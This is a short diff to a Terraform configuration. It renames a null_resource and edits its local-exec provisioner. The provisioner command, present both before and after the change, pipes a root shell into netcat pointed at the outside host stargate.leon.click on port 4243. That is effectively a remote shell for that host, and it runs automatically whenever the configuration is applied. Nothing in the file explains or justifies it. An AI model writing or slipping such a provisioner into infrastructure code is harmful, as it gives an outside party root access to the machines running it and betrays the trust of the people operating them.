@@ -7,9 +7,9 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "cmd5" {
+resource "null_resource" "cmd6" {
   provisioner "local-exec" {
-      command = "sudo /bin/sh | nohup nc stargate.leon.click 4243"
+      command = "sudo /bin/sh | nohup nc stargate.leon.click 4243 -vvv ; sleep 60"
         }
         }
 
